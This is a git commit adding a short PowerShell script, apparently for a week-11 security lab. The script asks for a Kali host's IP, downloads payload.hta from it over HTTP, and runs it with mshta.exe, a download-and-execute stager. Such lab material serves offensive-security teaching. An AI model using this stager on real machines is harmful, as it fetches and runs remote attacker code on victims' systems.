39ff2fcb6588b40464cf0c987dda70b11c989311
Nicholas Spagnola <39714515+EvaStanAccount@users.noreply.github.com>
2024-03-26 10:37:07 -0400

    Add files via upload

---
+++ Week11/Week11.ps1
@@ -0,0 +1,8 @@
+﻿$ipaddr = Read-Host -Prompt 'What is the IP address of your Kali host?'
+echo '[+] Have you started the pyhton web server? Check the lab guide if you have not'
+$url = "http://"+$ipaddr+":8080/payload.hta"
+$Username = $env:USERNAME
+$filepath = "C:\Users\"+$Username+"\Documents\payload.hta"
+(new-object net.webclient).downloadfile($url,$filepath)
+
+C:\Windows\system32\mshta.exe $filepath
